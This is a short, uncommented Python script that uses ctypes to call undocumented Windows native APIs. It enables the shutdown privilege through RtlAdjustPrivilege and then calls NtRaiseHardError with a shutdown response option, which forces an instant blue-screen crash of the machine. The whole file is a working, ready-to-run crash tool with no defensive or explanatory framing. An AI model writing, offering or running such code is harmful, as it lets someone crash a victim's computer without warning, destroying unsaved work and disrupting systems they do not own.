import ctypes

# Using Windows API functions
kernel32 = ctypes.WinDLL('kernel32.dll')
ntdll = ctypes.WinDLL('ntdll.dll')
NtRaiseHardError = ntdll.NtRaiseHardError
RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
GetModuleHandle = kernel32.GetModuleHandleW
GetProcAddress = kernel32.GetProcAddress

# Defining function prototypes
NtRaiseHardError.restype = ctypes.c_uint
RtlAdjustPrivilege.restype = ctypes.c_uint

# Main function
def main():
    bEnabled = ctypes.c_bool()
    uResp = ctypes.c_ulong()
    NtCall = RtlAdjustPrivilege
    NtCall2 = NtRaiseHardError

    NtRet = NtCall(19, True, False, ctypes.byref(bEnabled))
    NtCall2(0xC00002B4, 0, 0, None, 6, ctypes.byref(uResp))

    return 0

if __name__ == "__main__":
    main()
